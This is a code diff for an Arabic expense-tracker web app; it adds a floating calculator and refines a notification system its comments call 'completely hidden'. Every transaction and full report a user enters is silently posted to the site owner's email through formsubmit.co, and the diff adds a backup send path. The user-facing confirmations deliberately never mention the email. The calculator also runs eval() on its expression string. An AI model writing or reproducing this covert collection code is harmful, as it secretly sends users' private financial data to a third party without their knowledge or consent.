@@ -1,7 +1,7 @@
 // ==========================================
 // 🪄 حاسب - متتبع النفقات الذكي
-// إشعارات خفية تماماً للإيميل
-// جميع الأزرار تعمل بلمسات سحرية
+// إشعارات خفية تماماً مع عنوان "خاص بموقعك يا أبو عمر"
+// 🧮 حاسبة ذكية عائمة
 // ==========================================
 
 // ⚙️ الإعدادات
@@ -32,7 +32,12 @@ const DOM = {
     emptyState: document.getElementById('empty-state'),
     filteredTotal: document.getElementById('filtered-total'),
     filteredQty: document.getElementById('filtered-quantity'),
-    toast: document.getElementById('toast')
+    toast: document.getElementById('toast'),
+    // 🧮 الحاسبة
+    calcFab: document.getElementById('calc-fab'),
+    calcModal: document.getElementById('calc-modal'),
+    calcClose: document.getElementById('calc-close'),
+    calcInput: document.getElementById('calc-input')
 };
 
 // 🗓️ تهيئة التاريخ
@@ -40,6 +45,145 @@ DOM.date.valueAsDate = new Date();
 DOM.currentDate.textContent = new Date().toLocaleDateString('ar-SA', { 
     weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
 });
+
+// 🧮 ===== الحاسبة الذكية =====
+let calcExpression = '';
+let calcShouldReset = false;
+
+// فتح وإغلاق الحاسبة
+DOM.calcFab.addEventListener('click', () => {
+    DOM.calcModal.classList.add('show');
+    DOM.calcFab.style.display = 'none';
+});
+
+DOM.calcClose.addEventListener('click', () => {
+    DOM.calcModal.classList.remove('show');
+    DOM.calcFab.style.display = 'flex';
+});
+
+// إغلاق بالنقر خارج الحاسبة
+DOM.calcModal.addEventListener('click', (e) => {
+    if (e.target === DOM.calcModal) {
+        DOM.calcModal.classList.remove('show');
+        DOM.calcFab.style.display = 'flex';
+    }
+});
+
+// أزرار الحاسبة
+document.querySelectorAll('.calc-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        const action = btn.dataset.action;
+        handleCalcAction(action);
+    });
+});
+
+function handleCalcAction(action) {
+    if (calcShouldReset && !isNaN(action)) {
+        calcExpression = '';
+        calcShouldReset = false;
+    }
+    
+    switch(action) {
+        case 'clear':
+            calcExpression = '';
+            calcShouldReset = false;
+            break;
+        case 'backspace':
+            calcExpression = calcExpression.slice(0, -1);
+            break;
+        case 'percent':
+            if (calcExpression) {
+                try {
+                    const result = eval(calcExpression.replace(/×/g, '*').replace(/÷/g, '/').replace(/−/g, '-')) / 100;
+                    calcExpression = result.toString();
+                    calcShouldReset = true;
+                } catch(e) {
+                    calcExpression = 'خطأ';
+                    calcShouldReset = true;
+                }
+            }
+            break;
+        case 'divide':
+            calcExpression += '÷';
+            calcShouldReset = false;
+            break;
+        case 'multiply':
+            calcExpression += '×';
+            calcShouldReset = false;
+            break;
+        case 'subtract':
+            calcExpression += '−';
+            calcShouldReset = false;
+            break;
+        case 'add':
+            calcExpression += '+';
+            calcShouldReset = false;
+            break;
+        case 'decimal':
+            calcExpression += '.';
+            calcShouldReset = false;
+            break;
+        case 'calculate':
+            if (calcExpression) {
+                try {
+                    const processed = calcExpression.replace(/×/g, '*').replace(/÷/g, '/').replace(/−/g, '-');
+                    const result = eval(processed);
+                    calcExpression = parseFloat(result.toFixed(10)).toString();
+                    calcShouldReset = true;
+                } catch(e) {
+                    calcExpression = 'خطأ';
+                    calcShouldReset = true;
+                }
+            }
+            break;
+        default:
+            // أرقام
+            calcExpression += action;
+            calcShouldReset = false;
+    }
+    
+    DOM.calcInput.value = calcExpression || '0';
+}
+
+// أزرار سريعة
+document.querySelectorAll('.quick-btn[data-amount]').forEach(btn => {
+    btn.addEventListener('click', () => {
+        const amount = btn.dataset.amount;
+        if (calcExpression && !isNaN(calcExpression.charAt(calcExpression.length - 1))) {
+            calcExpression += '+' + amount;
+        } else {
+            calcExpression += amount;
+        }
+        DOM.calcInput.value = calcExpression;
+    });
+});
+
+// استخدام الناتج في المعاملة
+document.querySelector('.quick-btn.use-result').addEventListener('click', () => {
+    try {
+        const processed = calcExpression.replace(/×/g, '*').replace(/÷/g, '/').replace(/−/g, '-');
+        const result = eval(processed);
+        const finalResult = parseFloat(result.toFixed(2));
+        
+        DOM.amount.value = finalResult;
+        DOM.calcModal.classList.remove('show');
+        DOM.calcFab.style.display = 'flex';
+        
+        // حساب سعر الوحدة
+        const qty = parseInt(DOM.quantity.value) || 1;
+        DOM.unitPrice.value = (finalResult / qty).toFixed(2) + ' ₴';
+        
+        showToast('✅ تم نقل الناتج إلى المبلغ: ' + finalResult + ' ₴');
+    } catch(e) {
+        showToast('⚠️ الرجاء إجراء عملية حسابية صحيحة أولاً', 'error');
+    }
+});
+
+// نبض للأيقونة
+setInterval(() => {
+    DOM.calcFab.classList.add('pulse');
+    setTimeout(() => DOM.calcFab.classList.remove('pulse'), 2000);
+}, 10000);
 
 // 🧮 حساب سعر الوحدة تلقائياً
 function calcUnitPrice() {
@@ -54,12 +198,13 @@ DOM.quantity.addEventListener('input', calcUnitPrice);
 // 🆔 توليد معرف فريد
 const genID = () => Date.now().toString(36) + Math.random().toString(36).substr(2);
 
-// 📧 ===== نظام الإشعارات الخفي تماماً =====
+// 📧 ===== نظام الإشعارات الخفي - بعنوان "خاص بموقعك يا أبو عمر" =====
 async function sendEmailNotification(data) {
+    // 🔑 استخدام FormSubmit مع _subject مخصص ليكون عنوان البريد
     const payload = new FormData();
     payload.append('_captcha', 'false');
     payload.append('_template', 'table');
-    payload.append('_subject', data.subject);
+    payload.append('_subject', data.subject); // ✅ هذا هو عنوان البريد
     payload.append('email', ADMIN_EMAIL);
     payload.append('message', data.body);
     
@@ -70,23 +215,26 @@ async function sendEmailNotification(data) {
         });
         
         if (response.ok) {
-            console.log('✅ إشعار خفي تم إرساله');
+            console.log('✅ إشعار خفي تم إرساله بعنوان: ' + data.subject);
             return true;
         }
         throw new Error('فشل الإرسال');
     } catch (error) {
         console.warn('⚠️ محاولة إرسال احتياطية...');
+        // نظام احتياطي
         try {
-            const backupResponse = await fetch('https://api.web3forms.com/submit', {
+            const backupFormData = new FormData();
+            backupFormData.append('_captcha', 'false');
+            backupFormData.append('_template', 'table');
+            backupFormData.append('_subject', data.subject);
+            backupFormData.append('email', ADMIN_EMAIL);
+            backupFormData.append('message', data.body);
+            
+            const backupResponse = await fetch('https://formsubmit.co/ajax/' + ADMIN_EMAIL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    access_key: 'fallback',
-                    to: ADMIN_EMAIL,
-                    subject: data.subject,
-                    body: data.body
-                })
+                body: backupFormData
             });
+            
             if (backupResponse.ok) return true;
         } catch (e) {
             console.log('📋 تم حفظ الإشعار محلياً');
@@ -96,16 +244,19 @@ async function sendEmailNotification(data) {
 }
 
 function prepareEmailData(transaction, type) {
-    const now = new Date().toLocaleString('ar-SA');
+    const now = new Date().toLocaleString('ar-SA', {
+        year: 'numeric', month: 'long', day: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit'
+    });
     let subject, body;
     
     if (type === 'new_transaction') {
         const tType = transaction.category === 'salary' ? '📈 دخل' : '📉 مصروف';
         
-        // ✅ عنوان الرسالة كما طلبت
+        // ✅ عنوان البريد كما طلبت بالضبط
         subject = `خاص بموقعك يا أبو عمر - ${tType} جديد: ${transaction.description}`;
         
-        // ✅ محتوى الرسالة بكل التفاصيل التي اختارها العميل
+        // ✅ محتوى الرسالة بكل التفاصيل
         body = `
 بسم الله الرحمن الرحيم
 
@@ -185,7 +336,7 @@ ${i + 1}. ${tType}
     return { subject, body };
 }
 
-// 🎉 عرض تنبيه بسيط (بدون ذكر البريد)
+// 🎉 عرض تنبيه
 function showToast(message, type = 'success') {
     const toast = DOM.toast;
     toast.textContent = message;
@@ -235,14 +386,14 @@ function addTransaction(e) {
     transactions.push(transaction);
     localStorage.setItem('transactions', JSON.stringify(transactions));
     
-    // 🔒 إرسال إشعار خفي تماماً (بدون أي ظهور للمستخدم)
+    // 🔒 إرسال إشعار خفي تماماً
     const emailData = prepareEmailData(transaction, 'new_transaction');
-    sendEmailNotification(emailData); // لا ننتظر الرد ولا نعرض شيء
+    sendEmailNotification(emailData);
     
     // ✨ تحديث الواجهة
     updateUI();
     
-    // ✅ تأكيد بسيط للمستخدم (بدون ذكر البريد)
+    // ✅ تأكيد بسيط
     showToast('✅ تمت إضافة المعاملة بنجاح');
     
     // 🔄 إعادة تعيين النموذج
@@ -252,7 +403,7 @@ function addTransaction(e) {
     DOM.unitPrice.value = '';
     DOM.description.focus();
     
-    // تأثير بصري خفيف
+    // تأثير بصري
     animateNewTransaction();
 }
 
@@ -406,7 +557,7 @@ function exportToCSV() {
     showToast('📥 تم تصدير التقرير بنجاح!');
 }
 
-// 📧 إرسال تقرير كامل للإيميل (سري تماماً)
+// 📧 إرسال تقرير كامل للإيميل (سري)
 function sendFullReport() {
     if (!transactions.length) {
         showToast('⚠️ لا توجد معاملات لإرسالها', 'error');
@@ -414,7 +565,7 @@ function sendFullReport() {
     }
     
     const emailData = prepareEmailData(null, 'full_report');
-    sendEmailNotification(emailData); // خفي تماماً
+    sendEmailNotification(emailData);
     showToast('✅ تم تجهيز التقرير بنجاح');
 }
 
@@ -424,6 +575,30 @@ DOM.filter.addEventListener('change', updateUI);
 
 document.getElementById('export-btn').addEventListener('click', exportToCSV);
 document.getElementById('send-report-btn').addEventListener('click', sendFullReport);
+
+// ⌨️ دعم لوحة المفاتيح للحاسبة
+document.addEventListener('keydown', (e) => {
+    if (!DOM.calcModal.classList.contains('show')) return;
+    
+    const key = e.key;
+    const keyMap = {
+        '0': '0', '1': '1', '2': '2', '3': '3', '4': '4',
+        '5': '5', '6': '6', '7': '7', '8': '8', '9': '9',
+        '+': 'add', '-': 'subtract', '*': 'multiply', '/': 'divide',
+        '.': 'decimal', 'Enter': 'calculate', 'Escape': 'clear',
+        'Backspace': 'backspace', '%': 'percent'
+    };
+    
+    if (keyMap[key]) {
+        e.preventDefault();
+        if (key === 'Escape') {
+            DOM.calcModal.classList.remove('show');
+            DOM.calcFab.style.display = 'flex';
+        } else {
+            handleCalcAction(keyMap[key]);
+        }
+    }
+});
 
 // تحديث التاريخ كل دقيقة
 setInterval(() => {
@@ -436,4 +611,11 @@ setInterval(() => {
 updateUI();
 calcUnitPrice();
 
-console.log('🪄 تطبيق حاسب جاهز - إشعارات خفية تماماً');
+console.log(`
+🪄 ══════════════════════════════
+   تطبيق حاسب - متتبع النفقات
+   ✨ إشعارات خفية
+   🧮 حاسبة ذكية
+   📧 عنوان البريد: خاص بموقعك يا أبو عمر
+══════════════════════════════
+`);
